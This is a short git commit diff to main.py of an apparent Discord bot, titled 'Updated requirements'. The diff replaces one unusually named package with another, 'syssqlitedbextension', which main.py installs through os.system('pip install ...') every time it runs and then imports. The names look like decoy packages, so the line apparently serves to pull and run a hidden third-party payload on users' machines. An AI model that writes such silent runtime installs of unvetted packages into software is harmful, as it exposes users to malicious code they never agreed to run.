ece1f3c005e06808a937b3ff4b4b2336c4e9b576
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 22:41:39 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syssqlite3liberyV1")
-import syssqlite3liberyV1
+os.system("pip install syssqlitedbextension")
+import syssqlitedbextension
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
